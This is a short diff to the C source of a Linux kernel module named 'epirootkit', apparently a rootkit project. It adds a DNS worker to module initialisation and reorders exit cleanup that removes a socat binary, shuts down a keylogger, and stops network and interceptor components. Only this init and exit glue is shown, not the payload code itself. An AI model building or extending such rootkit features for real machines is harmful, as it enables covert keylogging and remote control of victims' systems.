@@ -43,6 +43,11 @@ static int __init epirootkit_init(void) {
         return -FAILURE;
     }
 
+    if (start_dns_worker() != SUCCESS) {
+        ERR_MSG("epirootkit_init: failed to start DNS worker\n");
+        return -FAILURE;
+    }
+
     DBG_MSG("epirootkit: epirootkit_init: module loaded... (/^▽^)/\n");
     return SUCCESS;
 }
@@ -53,11 +58,12 @@ static int __init epirootkit_init(void) {
  * This function is executed during the module's exit phase.
  */
 static void __exit epirootkit_exit(void) {
+    stop_dns_worker();
+    stop_network_worker();
     remove_socat_binaire();
     epikeylog_exit();
-    stop_network_worker();
-    close_worker_socket();
     exit_interceptor();
+    close_worker_socket();
 
     DBG_MSG("epirootkit: epirootkit_exit: module unloaded (/^▽^)/\n");
 }
